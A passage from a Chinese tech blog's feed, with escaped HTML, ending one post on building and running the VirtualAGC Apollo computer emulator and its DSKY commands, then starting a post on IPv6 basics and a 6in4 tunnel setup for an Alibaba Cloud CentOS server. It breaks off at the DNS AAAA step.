&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25&lt;/span&gt;&lt;span&gt;+       &lt;span style=&#34;color:#a00&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#033&#34;&gt;cc&lt;/span&gt;&lt;span style=&#34;color:#a00&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#a00&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#033&#34;&gt;CFLAGS0&lt;/span&gt;&lt;span style=&#34;color:#a00&#34;&gt;}&lt;/span&gt; -O0 -g -o &lt;span style=&#34;color:#033&#34;&gt;$@&lt;/span&gt; &lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;$(&lt;/span&gt;SOURCE&lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;)&lt;/span&gt; -lpthread -lrt &lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;$(&lt;/span&gt;LIBS&lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27&lt;/span&gt;&lt;span&gt; test.agc.bin: test.agc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28&lt;/span&gt;&lt;span&gt;        ../../virtualagc/yaYUL/yaYUL --block1 $^ &amp;gt;test.agc.lst&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;编译
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ make
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;$ make install&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
完成后会在用户目录下出现&amp;quot;VirtualAGC&amp;quot;目录，可运行程序都被安装到这个目录下。&lt;/p&gt;
&lt;h2 id=&#34;3-飞向月球吧&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3-%e9%a3%9e%e5%90%91%e6%9c%88%e7%90%83%e5%90%a7&#34;&gt;
        #
    &lt;/a&gt;
    3. 飞向月球吧
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;运行bin目录下的VirtualAGC即可运行起来。
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ ./bin/VirtualAGC&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;img src=&#34;http://imglf2.nosdn.127.net/img/NGpJbGd3MUdOUDN1eHVZY2NuYjJrM1dQVjlHOWwyRk1wQ3k0eTVocm9zY0VCNDIvMThmbWFRPT0.gif&#34; alt=&#34;VirtualAGC&#34;&gt;&lt;/p&gt;
&lt;p&gt;列几个CM的命令：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;V05N09E&lt;/td&gt;
&lt;td&gt;查看报警代码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V35E&lt;/td&gt;
&lt;td&gt;DSKY灯管测试&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V91E V33E&lt;/td&gt;
&lt;td&gt;查看内存bank检矫码，使用V33E指令来选择其他内存bank&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V16N36E/V16N65E&lt;/td&gt;
&lt;td&gt;查看系统当前时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V25N36E&lt;/td&gt;
&lt;td&gt;设置时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V27N02E&lt;/td&gt;
&lt;td&gt;查看core-rope中的内容，通过键盘在R3中输入8进制的地址来查看其中的内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V01N02E&lt;/td&gt;
&lt;td&gt;查看可擦写内存中的内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V21N02E&lt;/td&gt;
&lt;td&gt;修改内存的内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V36E&lt;/td&gt;
&lt;td&gt;重启&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;完整的命令列表可以在Github上的代码中&lt;a href=&#34;https://github.com/virtualagc/virtualagc/blob/master/Colossus249/ASSEMBLY_AND_OPERATION_INFORMATION.agc&#34;&gt;ASSEMBLY_AND_OPERATION_INFORMATION.s&lt;/a&gt;看到。&lt;/p&gt;
&lt;p&gt;几个LM的命令：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;V35E&lt;/td&gt;
&lt;td&gt;DSKY灯管测试&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V37E 00E&lt;/td&gt;
&lt;td&gt;启动P00号程序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V25E N01E 01365E 0E 0E 0E&lt;/td&gt;
&lt;td&gt;设置自检测试失败次数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V21 N27E 10E&lt;/td&gt;
&lt;td&gt;启动自检程序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V21 N27E 0E&lt;/td&gt;
&lt;td&gt;关闭自检程序&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;完整的命令列表可以在Github上的代码中&lt;a href=&#34;https://github.com/virtualagc/virtualagc/blob/master/Luminary099/ASSEMBLY_AND_OPERATION_INFORMATION.agc&#34;&gt;ASSEMBLY_AND_OPERATION_INFORMATION.s&lt;/a&gt;看到。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>阿里云ECS EIP服务进行IPv6改造的方法</title>
      <link>/2017/01/%E9%98%BF%E9%87%8C%E4%BA%91ecs-eip%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8Cipv6%E6%94%B9%E9%80%A0%E7%9A%84%E6%96%B9%E6%B3%95/</link>
      <pubDate>Wed, 18 Jan 2017 18:56:51 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/01/%E9%98%BF%E9%87%8C%E4%BA%91ecs-eip%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8Cipv6%E6%94%B9%E9%80%A0%E7%9A%84%E6%96%B9%E6%B3%95/</guid>
      <description>&lt;p&gt;最近团队开发的APP提交到苹果APP store时被拒了，原因是不支持IPv6的访问。原来苹果App store从2016年6月开始强制新上线APP支持IPv6网络，但由于IPv6基础设施在国内的推广非常缓慢，因此导致了该问题。&lt;/p&gt;
&lt;h1 id=&#34;ipv6介绍&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ipv6%e4%bb%8b%e7%bb%8d&#34;&gt;
        ##
    &lt;/a&gt;
    IPv6介绍
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;为了理解IPv6需要先了解其产生的原因，就是IPv4地址资源的问题。IPv4的网络使用32位的地址空间（XX.XX.XX.XX），因此最大支持的数量是4,294,967,296（2^32个），其中还有1800多万个&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C&#34;&gt;私有地址&lt;/a&gt;和2.7亿个&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E5%A4%9A%E6%92%AD&#34;&gt;多播地址&lt;/a&gt;。互联网的发展显然超出了普通的32位地址空间的容量，IPv6地址使用128位的地址空间，这意味着几乎取之不尽的地址空间。另外IPv6比IPv4还进行了很多的改进与扩充。&lt;/p&gt;
&lt;h2 id=&#34;ipv6地址&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ipv6%e5%9c%b0%e5%9d%80&#34;&gt;
        #
    &lt;/a&gt;
    IPv6地址
&lt;/div&gt;
&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;冒分16进制表示法（XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX），每个部分中的0可以省略。比如：2001:0DB8:0000:0023:0008:0800:200C:417A 可以缩写为2001:DB8:0:23:8:800:200C:417A&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;0位压缩。如果地址中包含很多连续的0，可以把0压缩为&amp;quot;::&amp;quot;，并且&amp;quot;::&amp;ldquo;只能出现1次。
比如 FF01:0:0:0:0:0:0:1101 可以缩略为 FF01::1101&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;内嵌IPv4地址表示法。为了实现IPv4-IPv6互通，IPv4地址会嵌入IPv6地址中，此时地址常表示为：X:X:X:X:X:X:d.d.d.d，前96b采用冒分十六进制表示，而最后32b地址则使用IPv4的点分十进制表示，例如::192.168.0.1与::FFFF:192.168.0.1就是两个典型的例子，注意在前96b中，压缩0位的方法依旧适用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ipv6地址分类&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ipv6%e5%9c%b0%e5%9d%80%e5%88%86%e7%b1%bb&#34;&gt;
        #
    &lt;/a&gt;
    IPv6地址分类
&lt;/div&gt;
&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;地址类型&lt;/th&gt;
&lt;th&gt;IPv4&lt;/th&gt;
&lt;th&gt;IPv6&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单播(unicast)&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;组播(multicast)&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;任播(anycast)&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;广播&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;No (通过组播来达到类似目的)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;IPv6的地址类型通过地址的前缀进行区别&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;IPv6地址类型&lt;/th&gt;
&lt;th&gt;前缀标识&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Loopback (unicast)&lt;/td&gt;
&lt;td&gt;::1/128&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Link local (unicast)&lt;/td&gt;
&lt;td&gt;FE80::/10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Site local (unicast)&lt;/td&gt;
&lt;td&gt;FEC0::/10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Global (unicast)&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;multicast&lt;/td&gt;
&lt;td&gt;FF00::/8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;anycast&lt;/td&gt;
&lt;td&gt;从单播地址空间中分配&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;ipv4-vs-ipv6&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ipv4-vs-ipv6&#34;&gt;
        #
    &lt;/a&gt;
    IPv4 vs IPv6
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;IPv6比IPv4的优势：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;IPv6具有更大的地址空间。IPv4中规定IP地址长度为32，最大地址个数为2^32；而IPv6中IP地址的长度为128，即最大地址个数为2^128。与32位地址空间相比，其地址空间增加了2^128-2^32个。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IPv6使用更小的路由表。IPv6的地址分配一开始就遵循聚类（Aggregation）的原则，这使得路由器能在路由表中用一条记录（Entry）表示一片子网，大大减小了路由器中路由表的长度，提高了路由器转发数据包的速度。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IPv6增加了增强的组播（Multicast）支持以及对流的控制（Flow Control），这使得网络上的多媒体应用有了长足发展的机会，为服务质量（QoS，Quality of Service）控制提供了良好的网络平台。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IPv6加入了对自动配置（Auto Configuration）的支持。这是对DHCP协议的改进和扩展，使得网络（尤其是局域网）的管理更加方便和快捷。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IPv6具有更高的安全性。在使用IPv6网络中用户可以对网络层的数据进行加密并对IP报文进行校验，在IPV6中的加密与鉴别选项提供了分组的保密性与完整性。极大的增强了网络的安全性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;允许扩充。如果新的技术或应用需要时，IPV6允许协议进行扩充。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;更好的头部格式。IPV6使用新的头部格式，其选项与基本头部分开，如果需要，可将选项插入到基本头部与上层数据之间。这就简化和加速了路由选择过程，因为大多数的选项不需要由路由选择。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;新的选项。IPV6有一些新的选项来实现附加的功能[14]  。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;阿里ecs-eip-服务ipv6支持方法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%98%bf%e9%87%8cecs-eip-%e6%9c%8d%e5%8a%a1ipv6%e6%94%af%e6%8c%81%e6%96%b9%e6%b3%95&#34;&gt;
        ##
    &lt;/a&gt;
    阿里ECS EIP 服务IPv6支持方法
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;6in4隧道方式&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#6in4%e9%9a%a7%e9%81%93%e6%96%b9%e5%bc%8f&#34;&gt;
        #
    &lt;/a&gt;
    6in4隧道方式
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;6in4的方法是将IPv6的数据包包裹在IPv4的数据包中在IPv4的网络上传输，并通过IPv4/IPv6的网络交界处部署的tunnel broker进行疯转转发，基本工作原理如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IPv6网络上的客户端对服务进行访问时发送IPv6数据包，数据包到达tunnel
broker的服务器端，broker将数据包进行IPv4的封装通过隧道发送到你的IPv4服务器端，在隧道的另一端进行IPv6数据包的应用层处理。&lt;/li&gt;
&lt;li&gt;你的服务器收到数据包进行应用层处理后将相应数据包进行IPv6封装，再通过隧道包裹成IPv4的数据报文进行隧道传输，当数据包抵达IPv4/IPv6的网络交界处的tunnel broker时，tunnel broker将IPv6的包解析出来在IPv6的网络上进行传递到达IPv6的客户端。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面我们以6in4的方式对阿里云ECS服务器上使用EIP的服务进行IPv6改造。&lt;/p&gt;
&lt;h3 id=&#34;1-创建tunnel&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e5%88%9b%e5%bb%batunnel&#34;&gt;
        ##
    &lt;/a&gt;
    1. 创建tunnel
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;到&lt;a href=&#34;https://www.tunnelbroker.net&#34;&gt;tunnelbroker&lt;/a&gt;注册账号，并且创建一个新的常规(Regular) tunnel。创建时候需要在&amp;rsquo;IPv4 Endpoint&amp;rsquo;栏填入服务器的公网IPv4地址，并在&amp;rsquo;Available Tunnel Servers&amp;rsquo;中选择一个适合自己的服务器区域，过程如下图：
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/01/create_tunnel.jpg&#34; alt=&#34;创建tunnel&#34;&gt;&lt;/p&gt;
&lt;p&gt;创建完成后的tunnel包含了几个重要的信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Server IPv4 Address: 这个是tunnel服务端的IPv4地址，创建tunnel的时候需要用到。&lt;/li&gt;
&lt;li&gt;Server IPv6 Address: 这个是tunnel的服务端IPv6地址。&lt;/li&gt;
&lt;li&gt;Client IPv4 Address: 这个是tunnel客户端的IPv4地址。&lt;/li&gt;
&lt;li&gt;Client IPv6 Address: 这个地址需要设置在CentOS服务器的tunnel上面，也是后面DNS服务器需要设置的AAAA记录对应的地址。
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/01/tunnel_detail.jpg&#34; alt=&#34;tunnel详情&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-解除阿里云主机ipv6限制&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-%e8%a7%a3%e9%99%a4%e9%98%bf%e9%87%8c%e4%ba%91%e4%b8%bb%e6%9c%baipv6%e9%99%90%e5%88%b6&#34;&gt;
        ##
    &lt;/a&gt;
    2. 解除阿里云主机IPv6限制
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;阿里云的CentOS主机默认状态下是把IPv6给禁掉的，可以使用下面的脚本先把系统的IPv6功能打开。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#099&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#099&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;mkdir ipv6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;mv /etc/modprobe.d/disable_ipv6.conf ipv6/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;modprobe ipv6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;cp /etc/sysctl.conf ipv6/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;cat /etc/sysctl.conf | sed -e &lt;span style=&#34;color:#c30&#34;&gt;&amp;#39;s/disable_ipv6 = 1/disable_ipv6 = 0/&amp;#39;&lt;/span&gt; &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;/etc/.sysctl.conf.bak
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;mv -f /etc/.sysctl.conf.bak /etc/sysctl.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;sysctl -p /etc/sysctl.conf&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;完成上面配置后可以用&amp;rsquo;ifconfig&amp;rsquo;检验一下网络接口，如果出现&amp;rsquo;inet6&amp;rsquo;类型的信息说明配置已经生效。&lt;/p&gt;
&lt;h3 id=&#34;3-配置centos服务器端tunnel&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3-%e9%85%8d%e7%bd%aecentos%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%ab%aftunnel&#34;&gt;
        ##
    &lt;/a&gt;
    3. 配置CentOS服务器端tunnel
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;这里顺带介绍一下Linux支持的几种隧道：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP隧道：通过将IPv4数据包封装进另一个IPv4数据包中进行发送，实现两个互不连通的IP网络之间的连接。但是不能通过隧道进行广播或者IPv6数据包的发送。&lt;/li&gt;
&lt;li&gt;SIT隧道：将IPv6数据包封装进IPv4数据包中，对应6in4的场景。&lt;/li&gt;
&lt;li&gt;GRE隧道：最初是由cisco开发的隧道协议，能够进行多播及IPv6数据包的发送。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这次主要介绍&amp;quot;SIT&amp;quot;隧道的方案。现在需要用到上面创建tunnel时的&amp;rsquo;Server IPv4 Address&amp;rsquo;/&amp;lsquo;Client IPv4 Address&amp;rsquo;/&amp;lsquo;Client IPv6 Address&amp;rsquo;，在你的ECS主机上面运行下面的命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;ip tunnel add he-ipv6 mode sit remote &lt;span style=&#34;color:#555&#34;&gt;[&lt;/span&gt;Server IPv4 Address&lt;span style=&#34;color:#555&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#366&#34;&gt;local&lt;/span&gt; &lt;span style=&#34;color:#555&#34;&gt;[&lt;/span&gt;Client IPv4 Address&lt;span style=&#34;color:#555&#34;&gt;]&lt;/span&gt; ttl &lt;span style=&#34;color:#f60&#34;&gt;255&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;ip link &lt;span style=&#34;color:#366&#34;&gt;set&lt;/span&gt; he-ipv6 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;&lt;span&gt;ip addr add &lt;span style=&#34;color:#555&#34;&gt;[&lt;/span&gt;Client IPv6 Address&lt;span style=&#34;color:#555&#34;&gt;]&lt;/span&gt;/64 dev he-ipv6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;&lt;span&gt;ip route add ::/0 dev he-ipv6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;&lt;span&gt;ip -f inet6 addr&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;完成这一步后已经可以对&amp;rsquo;[Client IPv6 Address]&amp;lsquo;进行访问了，可以通过&amp;rsquo;ping6&amp;rsquo;或者&amp;rsquo;curl&amp;rsquo;进行验证。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#09f;font-style:italic&#34;&gt;# ping6 [Client IPv6 Address]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#09f;font-style:italic&#34;&gt;# curl --globoff -6 [Client IPv6 Address]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;4-设置dns-aaaa记录&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#4-%e8%ae%be%e7%bd%aedns-aaaa%e8%ae%b0%e5%bd%95&#34;&gt;
        ##
